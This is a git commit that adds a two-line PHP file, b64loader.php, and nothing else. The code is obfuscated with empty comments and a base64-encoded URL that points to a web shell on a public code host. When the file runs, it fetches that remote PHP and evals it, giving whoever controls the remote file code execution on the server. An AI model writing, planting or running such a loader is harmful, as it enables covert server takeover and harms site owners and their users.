1a764cddf160027db1849e71adefa546ccf2d796
6ickzone <6ickwhispers@gmail.com>
2025-08-31 20:08:05 +0700

    Create b64loader.php

---
+++ b64loader.php
@@ -0,0 +1,2 @@
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/(base64_decode/*******/("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzZpY2t6b25lLzB4Nk55eFdlYlNoZWxsL3JlZnMv
+aGVhZHMvbWFpbi92b2lkLnBocA==")));/**/?>
